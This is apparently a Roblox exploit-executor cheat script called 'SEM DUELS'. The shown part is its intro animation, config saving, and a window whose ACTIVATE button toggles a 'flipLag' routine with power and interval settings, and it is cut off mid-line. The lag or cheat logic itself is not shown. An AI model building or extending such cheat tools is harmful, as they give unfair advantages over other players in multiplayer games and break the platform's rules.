-- SEM DUELS
-- PC + Controller keybind | Customizable | Auto-save | Auto Detection

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local SoundService     = game:GetService("SoundService")

local plr              = Players.LocalPlayer
local plrGui           = plr:WaitForChild("PlayerGui")

-- ══════════════════════════════════════════════════════════════════════
-- INTRO ACE STYLE - SEM DUELS (Rojo y Negro)
-- ══════════════════════════════════════════════════════════════════════
local _introFinished = false
local _onIntroFinishedCbs = {}

local function onIntroFinished(cb)
    if _introFinished then 
        task.defer(cb) 
    else 
        table.insert(_onIntroFinishedCbs, cb) 
    end
end

local function markIntroFinished()
    if _introFinished then return end
    _introFinished = true
    for _, cb in ipairs(_onIntroFinishedCbs) do 
        pcall(cb) 
    end
    _onIntroFinishedCbs = {}
end

local function IntroSemDuelsStyle()
    local TS = TweenService
    local introGuiParent = plrGui

    local introGui = Instance.new("ScreenGui")
    introGui.Name = "SemDuelsIntro"
    introGui.IgnoreGuiInset = true
    introGui.DisplayOrder = 9999
    introGui.ResetOnSpawn = false
    introGui.Parent = introGuiParent

    local introActive = true

    -- Música opcional
    local introSound = Instance.new("Sound")
    introSound.Name = "IntroMusic"
    introSound.SoundId = "rbxassetid://140245756477343"
    introSound.Volume = 0.35
    introSound.Looped = false
    introSound.TimePosition = 2.5
    introSound.Parent = introGui
    pcall(function() introSound:Play() end)

    local function finishIntro()
        if not introActive then return end
        introActive = false
        pcall(function()
            TS:Create(introSound, TweenInfo.new(0.4), {Volume = 0}):Play()
        end)
        task.delay(0.5, function()
            pcall(function() introSound:Stop() end)
            pcall(function() introGui:Destroy() end)
            markIntroFinished()
        end)
    end

    -- Fondo oscuro con degradado rojo-negro
    local darkBg = Instance.new("Frame", introGui)
    darkBg.Size = UDim2.new(1, 0, 1, 0)
    darkBg.BackgroundColor3 = Color3.fromRGB(8, 0, 0)
    darkBg.BackgroundTransparency = 1
    darkBg.BorderSizePixel = 0
    darkBg.ZIndex = 1
    local bgGrad = Instance.new("UIGradient", darkBg)
    bgGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 0, 0)),
        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(20, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 0, 0))
    })
    bgGrad.Rotation = 90

    -- Botón SKIP INTRO
    local skipBtn = Instance.new("TextButton", introGui)
    skipBtn.Name = "SkipIntro"
    skipBtn.AnchorPoint = Vector2.new(1, 0)
    skipBtn.Position = UDim2.new(1, -22, 0, 22)
    skipBtn.Size = UDim2.new(0, 104, 0, 34)
    skipBtn.BackgroundColor3 = Color3.fromRGB(235, 235, 240)
    skipBtn.BackgroundTransparency = 0.08
    skipBtn.BorderSizePixel = 0
    skipBtn.Text = "SKIP INTRO"
    skipBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    skipBtn.TextSize = 11
    skipBtn.Font = Enum.Font.GothamBlack
    skipBtn.AutoButtonColor = false
    skipBtn.ZIndex = 80
    Instance.new("UICorner", skipBtn).CornerRadius = UDim.new(0, 10)
    local skipStroke = Instance.new("UIStroke", skipBtn)
    skipStroke.Color = Color3.fromRGB(255, 255, 255)
    skipStroke.Thickness = 1
    skipStroke.Transparency = 0.12
    skipBtn.MouseButton1Click:Connect(finishIntro)

    -- Cartas con A♠ rojas
    local function makeAceCard(parent, size, z)
        local card = Instance.new("Frame", parent)
        card.Size = UDim2.new(0, math.floor(size * 0.68), 0, size)
        card.AnchorPoint = Vector2.new(0.5, 0.5)
        card.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
        card.BackgroundTransparency = 1
        card.BorderSizePixel = 0
        card.ZIndex = z or 6
        Instance.new("UICorner", card).CornerRadius = UDim.new(0, math.max(8, math.floor(size * 0.08)))
        local stroke = Instance.new("UIStroke", card)
        stroke.Color = Color3.fromRGB(180, 20, 20)
        stroke.Thickness = 1.5
        stroke.Transparency = 1
        local grad = Instance.new("UIGradient", card)
        grad.Color = ColorSequence.new(Color3.fromRGB(80, 0, 0), Color3.fromRGB(180, 20, 20))
        grad.Rotation = 125
        local a1 = Instance.new("TextLabel", card)
        a1.Size = UDim2.new(0.28, 0, 0.25, 0)
        a1.Position = UDim2.new(0.06, 0, 0.04, 0)
        a1.BackgroundTransparency = 1
        a1.Text = "S\n♠"
        a1.TextColor3 = Color3.fromRGB(255, 50, 50)
        a1.Font = Enum.Font.GothamBlack
        a1.TextScaled = true
        a1.TextTransparency = 1
        a1.ZIndex = (z or 6) + 1
        local suit = Instance.new("TextLabel", card)
        suit.Size = UDim2.new(0.62, 0, 0.52, 0)
        suit.Position = UDim2.new(0.19, 0, 0.25, 0)
        suit.BackgroundTransparency = 1
        suit.Text = "♠"
        suit.TextColor3 = Color3.fromRGB(255, 50, 50)
        suit.Font = Enum.Font.GothamBlack
        suit.TextScaled = true
        suit.TextTransparency = 1
        suit.ZIndex = (z or 6) + 1
        local a2 = Instance.new("TextLabel", card)
        a2.Size = UDim2.new(0.28, 0, 0.25, 0)
        a2.Position = UDim2.new(0.66, 0, 0.71, 0)
        a2.BackgroundTransparency = 1
        a2.Text = "S\n♠"
        a2.TextColor3 = Color3.fromRGB(255, 50, 50)
        a2.Font = Enum.Font.GothamBlack
        a2.TextScaled = true
        a2.TextTransparency = 1
        a2.Rotation = 180
        a2.ZIndex = (z or 6) + 1
        return card, {a1, suit, a2}, stroke
    end

    -- Cartas volando
    local cards = {}
    for i = 1, 24 do
        local size = math.random(46, 108)
        local card, labels, stroke = makeAceCard(introGui, size, 5 + i)
        local side = (i % 2 == 0) and -0.35 or 1.35
        local targetSide = (i % 2 == 0) and 1.35 or -0.35
        local y = math.random(4, 96) / 100
        card.Position = UDim2.new(side, 0, y, 0)
        card.Rotation = math.random(-40, 40)
        cards[i] = {
            frame = card,
            labels = labels,
            stroke = stroke,
            startX = side,
            endX = targetSide,
            y = y,
            speed = 0.09 + math.random() * 0.10,
            bob = math.random() * 6.28,
            rot = math.random(-55, 55),
            drift = math.random(-14, 14) / 100
        }
    end

    -- Carta central grande con S♠
    local aceLogo, aceLabels, aceStroke = makeAceCard(introGui, 170, 25)
    aceLogo.Position = UDim2.new(0.5, 0, -0.35, 0)
    aceLogo.Rotation = -12

    local t = 0
    local driftConn = RunService.Heartbeat:Connect(function(dt)
        if not introActive then return end
        t = t + dt
        for _, cd in ipairs(cards) do
            local currentX = cd.frame.Position.X.Scale
            local dir = cd.startX < cd.endX and 1 or -1
            local newX = currentX + dir * cd.speed * dt
            if (dir == 1 and newX > 1.40) or (dir == -1 and newX < -0.40) then
                newX = cd.startX
            end
            local newY = math.clamp(cd.y + math.sin(t * 1.5 + cd.bob) * 0.035 + cd.drift, -0.08, 1.08)
            cd.frame.Position = UDim2.new(newX, 0, newY, 0)
            cd.frame.Rotation = cd.rot + math.sin(t * 2.5 + cd.bob) * 14
        end
    end)

    -- Contenedor central
    local center = Instance.new("Frame", introGui)
    center.AnchorPoint = Vector2.new(0.5, 0.5)
    center.Position = UDim2.new(0.5, 0, 0.5, 0)
    center.Size = UDim2.new(0, 660, 0, 250)
    center.BackgroundTransparency = 1
    center.ZIndex = 40

    -- Líneas decorativas
    local lineTop = Instance.new("Frame", center)
    lineTop.AnchorPoint = Vector2.new(0.5, 0)
    lineTop.Position = UDim2.new(0.5, 0, 0, 58)
    lineTop.Size = UDim2.new(0, 0, 0, 2)
    lineTop.BackgroundColor3 = Color3.fromRGB(200, 20, 20)
    lineTop.BorderSizePixel = 0
    lineTop.ZIndex = 41

    local lineBot = Instance.new("Frame", center)
    lineBot.AnchorPoint = Vector2.new(0.5, 1)
    lineBot.Position = UDim2.new(0.5, 0, 1, -8)
    lineBot.Size = UDim2.new(0, 0, 0, 2)
    lineBot.BackgroundColor3 = Color3.fromRGB(200, 20, 20)
    lineBot.BorderSizePixel = 0
    lineBot.ZIndex = 41

    -- Título principal con sombra
    local titleShadow = Instance.new("TextLabel", center)
    titleShadow.Size = UDim2.new(1, 0, 0, 86)
    titleShadow.Position = UDim2.new(0, 4, 0, 83)
    titleShadow.BackgroundTransparency = 1
    titleShadow.Text = "SEM DUELS"
    titleShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
    titleShadow.Font = Enum.Font.GothamBlack
    titleShadow.TextSize = 48
    titleShadow.TextTransparency = 1
    titleShadow.TextStrokeTransparency = 1
    titleShadow.ZIndex = 42

    local title = Instance.new("TextLabel", center)
    title.Size = UDim2.new(1, 0, 0, 86)
    title.Position = UDim2.new(0, 0, 0, 78)
    title.BackgroundTransparency = 1
    title.Text = "SEM DUELS"
    title.TextColor3 = Color3.fromRGB(255, 50, 50)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 48
    title.TextTransparency = 1
    title.TextStrokeTransparency = 1
    title.TextStrokeColor3 = Color3.fromRGB(60, 0, 0)
    title.ZIndex = 43

    -- Subtítulo
    local subtitle = Instance.new("TextLabel", center)
    subtitle.Size = UDim2.new(1, 0, 0, 26)
    subtitle.Position = UDim2.new(0, 0, 0, 169)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "BY SEM DUELS"
    subtitle.TextColor3 = Color3.fromRGB(255, 180, 180)
    subtitle.Font = Enum.Font.GothamMedium
    subtitle.TextSize = 18
    subtitle.TextTransparency = 1
    subtitle.ZIndex = 43

    -- Animación de entrada
    TS:Create(darkBg, TweenInfo.new(0.65), {BackgroundTransparency = 0.15}):Play()

    -- Aparecer cartas
    for _, cd in ipairs(cards) do
        task.delay(math.random() * 0.9, function()
            if not introActive then return end
            TS:Create(cd.frame, TweenInfo.new(0.65), {BackgroundTransparency = 0.12}):Play()
            if cd.stroke then TS:Create(cd.stroke, TweenInfo.new(0.65), {Transparency = 0.25}):Play() end
            for _, lbl in ipairs(cd.labels) do
                TS:Create(lbl, TweenInfo.new(0.65), {TextTransparency = 0}):Play()
            end
        end)
    end

    task.wait(0.85)
    if not introActive then
        pcall(function() driftConn:Disconnect() end)
        return
    end

    -- Aparecer carta central
    TS:Create(aceLogo, TweenInfo.new(1.15, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, 0, 0.20, 0),
        BackgroundTransparency = 0.02,
        Rotation = 8
    }):Play()
    if aceStroke then TS:Create(aceStroke, TweenInfo.new(0.55), {Transparency = 0.15}):Play() end
    for _, lbl in ipairs(aceLabels) do
        TS:Create(lbl, TweenInfo.new(0.55), {TextTransparency = 0}):Play()
    end

    task.wait(1.05)
    if not introActive then
        pcall(function() driftConn:Disconnect() end)
        return
    end

    -- Líneas aparecen
    TS:Create(lineTop, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, 500, 0, 2)}):Play()
    TS:Create(lineBot, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, 500, 0, 2)}):Play()
    task.wait(0.12)

    -- Título y subtítulo
    TS:Create(titleShadow, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        TextTransparency = 0.35,
        TextStrokeTransparency = 1
    }):Play()
    TS:Create(title, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        TextTransparency = 0,
        TextStrokeTransparency = 0.18
    }):Play()
    task.wait(0.42)
    TS:Create(subtitle, TweenInfo.new(0.42), {TextTransparency = 0}):Play()

    -- Efecto de parpadeo en el título
    for i = 1, 3 do
        if not introActive then break end
        TS:Create(title, TweenInfo.new(0.06), {TextColor3 = Color3.fromRGB(200, 20, 20)}):Play()
        task.wait(0.06)
        TS:Create(title, TweenInfo.new(0.06), {TextColor3 = Color3.fromRGB(255, 50, 50)}):Play()
        task.wait(0.06)
    end

    task.wait(3.05)
    if not introActive then
        pcall(function() driftConn:Disconnect() end)
        return
    end

    -- Salida
    TS:Create(center, TweenInfo.new(0.55, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)}):Play()
    TS:Create(title, TweenInfo.new(0.36), {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
    TS:Create(titleShadow, TweenInfo.new(0.36), {TextTransparency = 1}):Play()
    TS:Create(subtitle, TweenInfo.new(0.32), {TextTransparency = 1}):Play()
    TS:Create(lineTop, TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 2)}):Play()
    TS:Create(lineBot, TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 2)}):Play()
    TS:Create(aceLogo, TweenInfo.new(0.55, Enum.EasingStyle.Quad), {
        Position = UDim2.new(0.5, 0, 1.25, 0),
        BackgroundTransparency = 1,
        Rotation = 28
    }):Play()
    for _, lbl in ipairs(aceLabels) do
        TS:Create(lbl, TweenInfo.new(0.45), {TextTransparency = 1}):Play()
    end
    if aceStroke then TS:Create(aceStroke, TweenInfo.new(0.45), {Transparency = 1}):Play() end
    TS:Create(darkBg, TweenInfo.new(0.75), {BackgroundTransparency = 1}):Play()
    for _, cd in ipairs(cards) do
        TS:Create(cd.frame, TweenInfo.new(0.55), {BackgroundTransparency = 1}):Play()
        if cd.stroke then TS:Create(cd.stroke, TweenInfo.new(0.55), {Transparency = 1}):Play() end
        for _, lbl in ipairs(cd.labels) do
            TS:Create(lbl, TweenInfo.new(0.55), {TextTransparency = 1}):Play()
        end
    end

    task.wait(0.9)
    introActive = false
    pcall(function() driftConn:Disconnect() end)
    pcall(function() introSound:Stop() end)
    pcall(function() introGui:Destroy() end)
    markIntroFinished()
end

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG & SAVE
-- ══════════════════════════════════════════════════════════════════════
local CONFIG_FILE = "SemDuels_Config.json"

local DEFAULT_CFG = {
    power         = 100000,
    interval      = 0.125,
    keybindKb     = "F",
    keybindGp     = "ButtonR2",
    autoBrainrot  = true,
}

local cfg = {
    power         = DEFAULT_CFG.power,
    interval      = DEFAULT_CFG.interval,
    keybindKb     = DEFAULT_CFG.keybindKb,
    keybindGp     = DEFAULT_CFG.keybindGp,
    autoBrainrot  = DEFAULT_CFG.autoBrainrot,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end

    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
end

loadConfig()

local active           = false
local listeningFor     = nil
local remote           = nil
local brainrotMode     = false
local lastBrainrotState = false
local manualOverride   = false
local locked           = false
local isMinimized      = false
local settingsOpen     = false

-- ══════════════════════════════════════════════════════════════════════
-- COLOURS - BLANCO, NEGRO Y ROJO
-- ══════════════════════════════════════════════════════════════════════
local C = {
    bg      = Color3.fromRGB(8,   8,  8),
    panel   = Color3.fromRGB(12, 12,  12),
    card    = Color3.fromRGB(20, 20,  20),
    black   = Color3.fromRGB(0,   0,   0),
    white   = Color3.fromRGB(255,255, 255),
    dim     = Color3.fromRGB(150,150, 150),
    green   = Color3.fromRGB(0,   255, 80),
    green2  = Color3.fromRGB(0,   200, 60),
    green3  = Color3.fromRGB(0,   255, 140),
    red1    = Color3.fromRGB(255, 0,   30),
    red2    = Color3.fromRGB(255, 50,  70),
    red3    = Color3.fromRGB(255, 100, 120),
    yellow  = Color3.fromRGB(255, 230, 50),
    waiting = Color3.fromRGB(255, 200,  40),
    inputBg = Color3.fromRGB(25,  25,  25),
    glow    = Color3.fromRGB(40,  40,  40),
}

local T = {
    bg      = 0.35,
    panel   = 0.30,
    card    = 0.28,
    header  = 0.12,
    inputBg = 0.20,
}

-- ══════════════════════════════════════════════════════════════════════
-- DESTROY OLD GUI
-- ══════════════════════════════════════════════════════════════════════
for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "SemDuelsGui" then kid:Destroy() end
end

local screen = Instance.new("ScreenGui")
screen.Name         = "SemDuelsGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.Parent       = plrGui

-- ══════════════════════════════════════════════════════════════════════
-- HELPERS
-- ══════════════════════════════════════════════════════════════════════
local function applyGradient(parent, c1, c2, rotation)
    local g = Instance.new("UIGradient", parent)
    g.Color    = ColorSequence.new({ ColorSequenceKeypoint.new(0,c1), ColorSequenceKeypoint.new(1,c2) })
    g.Rotation = rotation or 135
    return g
end

local function tw(obj, props, t)
    TweenService:Create(obj,
        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        props):Play()
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if locked then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1
        or i.UserInputType == Enum.UserInputType.Touch then
            dragging  = true
            dragStart = i.Position
            startPos  = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if locked then return end
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
                      or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape]      = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown]     = true,
}

-- ══════════════════════════════════════════════════════════════════════
-- MAIN WINDOW
-- ══════════════════════════════════════════════════════════════════════
local MAIN_W, MAIN_H = 220, 95

local mainFrame = Instance.new("Frame")
mainFrame.Name             = "MainFrame"
mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
mainFrame.BackgroundColor3 = C.black
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel  = 0
mainFrame.Active           = true
mainFrame.ClipsDescendants = true
mainFrame.Visible          = false  -- Oculto hasta que termine la intro
mainFrame.Parent           = screen
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)

-- Borde principal - ROJO cuando apagado, VERDE cuando activado
local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color        = C.red1
mainStroke.Thickness    = 2
mainStroke.Transparency = 0

makeDraggable(mainFrame)

-- Header
local header = Instance.new("Frame", mainFrame)
header.Size             = UDim2.new(1,0,0,32)
header.BackgroundColor3 = C.black
header.BackgroundTransparency = 0
header.BorderSizePixel  = 0
header.ZIndex           = 2
Instance.new("UICorner", header).CornerRadius = UDim.new(0,10)

-- Título
local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size               = UDim2.new(1,-20,1,0)
titleLbl.Position           = UDim2.new(0,10,0,0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text               = "SEM DUELS"
titleLbl.TextColor3         = C.white
titleLbl.Font               = Enum.Font.GothamBold
titleLbl.TextSize           = 12
titleLbl.TextXAlignment     = Enum.TextXAlignment.Center
titleLbl.ZIndex             = 3

-- "BY SEM DUELS"
local byLbl = Instance.new("TextLabel", header)
byLbl.Size               = UDim2.new(0,60,0,12)
byLbl.Position           = UDim2.new(1,-70,0.5,-6)
byLbl.BackgroundTransparency = 1
byLbl.Text               = "BY SEM DUELS"
byLbl.TextColor3         = C.red3
byLbl.Font               = Enum.Font.GothamBold
byLbl.TextSize           = 7
byLbl.TextXAlignment     = Enum.TextXAlignment.Right
byLbl.ZIndex             = 3

-- Botón minimizar
local miniBtn = Instance.new("TextButton", header)
miniBtn.Size             = UDim2.new(0,18,0,18)
miniBtn.Position         = UDim2.new(1,-22,0.5,-9)
miniBtn.BackgroundColor3 = C.black
miniBtn.BackgroundTransparency = 0
miniBtn.BorderSizePixel  = 0
miniBtn.AutoButtonColor  = false
miniBtn.Text             = "⬇"
miniBtn.TextColor3       = C.white
miniBtn.Font             = Enum.Font.GothamBlack
miniBtn.TextSize         = 9
miniBtn.ZIndex           = 23
Instance.new("UICorner", miniBtn).CornerRadius = UDim.new(0,3)

local miniStroke = Instance.new("UIStroke", miniBtn)
miniStroke.Color = C.white
miniStroke.Thickness = 1
miniStroke.Transparency = 0.5

miniBtn.MouseEnter:Connect(function()
    tw(miniStroke,{Transparency=0},0.1)
end)
miniBtn.MouseLeave:Connect(function()
    tw(miniStroke,{Transparency=0.5},0.1)
end)

miniBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    if isMinimized then
        tw(mainFrame, {Size=UDim2.new(0, MAIN_W, 0, 32)}, 0.2)
        miniBtn.Text = "⬆"
    else
        tw(mainFrame, {Size=UDim2.new(0, MAIN_W, 0, MAIN_H)}, 0.2)
        miniBtn.Text = "⬇"
    end
end)

-- Botón configuración (tuerca) - TOGGLE
local settingsBtn = Instance.new("TextButton", header)
settingsBtn.Size             = UDim2.new(0,18,0,18)
settingsBtn.Position         = UDim2.new(1,-44,0.5,-9)
settingsBtn.BackgroundColor3 = C.black
settingsBtn.BackgroundTransparency = 0
settingsBtn.BorderSizePixel  = 0
settingsBtn.AutoButtonColor  = false
settingsBtn.Text             = "⚙"
settingsBtn.TextColor3       = C.white
settingsBtn.Font             = Enum.Font.GothamBlack
settingsBtn.TextSize         = 10
settingsBtn.ZIndex           = 23
Instance.new("UICorner", settingsBtn).CornerRadius = UDim.new(0,3)

local settingsStroke = Instance.new("UIStroke", settingsBtn)
settingsStroke.Color        = C.white
settingsStroke.Thickness    = 1
settingsStroke.Transparency = 0.3

settingsBtn.MouseEnter:Connect(function()
    tw(settingsStroke,{Transparency=0},0.1)
end)
settingsBtn.MouseLeave:Connect(function()
    tw(settingsStroke,{Transparency=0.3},0.1)
end)

settingsBtn.MouseButton1Click:Connect(function()
    if settingsOpen then 
        closeSettings() 
    else 
        openSettings() 
    end
end)

-- Botón candado
local lockBtn = Instance.new("TextButton", header)
lockBtn.Size             = UDim2.new(0,18,0,18)
lockBtn.Position         = UDim2.new(1,-66,0.5,-9)
lockBtn.BackgroundColor3 = C.black
lockBtn.BackgroundTransparency = 0
lockBtn.BorderSizePixel  = 0
lockBtn.AutoButtonColor  = false
lockBtn.Text             = "🔓"
lockBtn.TextColor3       = C.white
lockBtn.Font             = Enum.Font.GothamBlack
lockBtn.TextSize         = 8
lockBtn.ZIndex           = 23
Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0,3)

local lockStroke = Instance.new("UIStroke", lockBtn)
lockStroke.Color        = C.white
lockStroke.Thickness    = 1
lockStroke.Transparency = 0.3

lockBtn.MouseEnter:Connect(function()
    if not locked then
        tw(lockStroke,{Transparency=0},0.1)
    end
end)
lockBtn.MouseLeave:Connect(function()
    if not locked then
        tw(lockStroke,{Transparency=0.3},0.1)
    end
end)

lockBtn.MouseButton1Click:Connect(function()
    locked = not locked
    if locked then
        lockBtn.Text = "🔒"
        tw(lockStroke,{Color=C.white, Transparency=0},0.15)
    else
        lockBtn.Text = "🔓"
        tw(lockStroke,{Color=C.red1, Transparency=0},0.15)
        task.delay(0.3, function()
            if not locked then
                tw(lockStroke,{Color=C.white, Transparency=0.3},0.15)
            end
        end)
    end
end)

-- Botón ACTIVATE
local activateBtn = Instance.new("TextButton", mainFrame)
activateBtn.Size             = UDim2.new(1,-16,0,34)
activateBtn.Position         = UDim2.new(0,8,0,40)
activateBtn.BackgroundColor3 = C.card
activateBtn.BackgroundTransparency = 0
activateBtn.BorderSizePixel  = 0
activateBtn.AutoButtonColor  = false
activateBtn.Text             = "ACTIVATE"
activateBtn.TextColor3       = C.white
activateBtn.Font             = Enum.Font.GothamBlack
activateBtn.TextSize         = 13
activateBtn.ZIndex           = 3
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0,6)

local activateStroke = Instance.new("UIStroke", activateBtn)
activateStroke.Color        = C.white
activateStroke.Thickness    = 1.5
activateStroke.Transparency = 0.4

activateBtn.MouseEnter:Connect(function()
    if not active then
        tw(activateStroke,{Transparency=0},0.1)
        tw(activateBtn,{BackgroundColor3=Color3.fromRGB(40,40,40)},0.1)
    end
end)
activateBtn.MouseLeave:Connect(function()
    if not active then
        tw(activateStroke,{Transparency=0.4},0.1)
        tw(activateBtn,{BackgroundColor3=C.card},0.1)
    end
end)

activateBtn.MouseButton1Click:Connect(function()
    flipLag(not active)
end)

-- ══════════════════════════════════════════════════════════════════════
-- SETTINGS PANEL
-- ══════════════════════════════════════════════════════════════════════
local SET_W, SET_H = 230, 200

local settingsFrame = Instance.new("Frame")
settingsFrame.Name             = "SettingsPanel"
settingsFrame.Size             = UDim2.new(0,SET_W,0,SET_H)
settingsFrame.Position         = UDim2.new(0.5,-SET_W/2,0.5,60)
settingsFrame.BackgroundColor3 = C.panel
settingsFrame.BackgroundTransparency = T.panel
settingsFrame.BorderSizePixel  = 0
settingsFrame.Active           = true
settingsFrame.ClipsDescendants = true
settingsFrame.Visible          = false
settingsFrame.ZIndex           = 20
settingsFrame.Parent           = screen
Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0,12)
applyGradient(settingsFrame, C.panel, Color3.fromRGB(8,8,8), 160)

local setStroke = Instance.new("UIStroke", settingsFrame)
setStroke.Color        = C.white
setStroke.Thickness    = 1.5
setStroke.Transparency = 0.3

makeDraggable(settingsFrame)

-- Settings header
local setHeader = Instance.new("Frame", settingsFrame)
setHeader.Size             = UDim2.new(1,0,0,32)
setHeader.BackgroundColor3 = C.black
setHeader.BackgroundTransparency = T.header
setHeader.BorderSizePixel  = 0
setHeader.ZIndex           = 21
Instance.new("UICorner", setHeader).CornerRadius = UDim.new(0,12)
applyGradient(setHeader, C.black, Color3.fromRGB(30,30,30), 135)

local setHeaderFill = Instance.new("Frame", settingsFrame)
setHeaderFill.Size             = UDim2.new(1,0,0,8)
setHeaderFill.Position         = UDim2.new(0,0,0,24)
setHeaderFill.BackgroundColor3 = C.black
setHeaderFill.BackgroundTransparency = T.header
setHeaderFill.BorderSizePixel  = 0
setHeaderFill.ZIndex           = 21
applyGradient(setHeaderFill, C.black, Color3.fromRGB(30,30,30), 135)

local setTitle = Instance.new("TextLabel", setHeader)
setTitle.Size               = UDim2.new(1,-80,1,0)
setTitle.Position           = UDim2.new(0,10,0,0)
setTitle.BackgroundTransparency = 1
setTitle.Text               = "CONFIGURACIONES"
setTitle.TextColor3         = C.white
setTitle.Font               = Enum.Font.GothamBlack
setTitle.TextSize           = 10
setTitle.TextXAlignment     = Enum.TextXAlignment.Left
setTitle.ZIndex             = 22

local setCloseBtn = Instance.new("TextButton", setHeader)
setCloseBtn.Size             = UDim2.new(0,24,0,24)
setCloseBtn.Position         = UDim2.new(1,-28,0.5,-12)
setCloseBtn.BackgroundColor3 = C.black
setCloseBtn.BackgroundTransparency = 0.15
setCloseBtn.BorderSizePixel  = 0
setCloseBtn.AutoButtonColor  = false
setCloseBtn.Text             = "X"
setCloseBtn.TextColor3       = C.white
setCloseBtn.Font             = Enum.Font.GothamBlack
setCloseBtn.TextSize         = 11
setCloseBtn.ZIndex           = 23
Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0,6)
local setCloseStroke = Instance.new("UIStroke", setCloseBtn)
setCloseStroke.Color = C.white
setCloseStroke.Thickness = 1
setCloseStroke.Transparency = 0.5
setCloseBtn.MouseEnter:Connect(function() 
    tw(setCloseBtn,{BackgroundColor3=C.red1},0.1)
    tw(setCloseStroke,{Transparency=0},0.1)
end)
setCloseBtn.MouseLeave:Connect(function() 
    tw(setCloseBtn,{BackgroundColor3=C.black},0.1)
    tw(setCloseStroke,{Transparency=0.5},0.1)
end)

setCloseBtn.MouseButton1Click:Connect(closeSettings)

-- ── Row builder para configuración ─────────────────────────────────
local function mkConfigRow(yPos, labelText, valueText)
    local row = Instance.new("Frame", settingsFrame)
    row.Size             = UDim2.new(1,-16,0,28)
    row.Position         = UDim2.new(0,8,0,yPos)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0
    row.BorderSizePixel  = 0
    row.ZIndex           = 21
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size               = UDim2.new(0.5,0,1,0)
    lbl.Position           = UDim2.new(0,10,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text               = labelText
    lbl.TextColor3         = C.white
    lbl.Font               = Enum.Font.GothamBold
    lbl.TextSize           = 10
    lbl.TextXAlignment     = Enum.TextXAlignment.Left
    lbl.ZIndex             = 22

    local val = Instance.new("TextButton", row)
    val.Size               = UDim2.new(0.4,0,1,0)
    val.Position           = UDim2.new(0.5,0,0,0)
    val.BackgroundTransparency = 1
    val.Text               = valueText
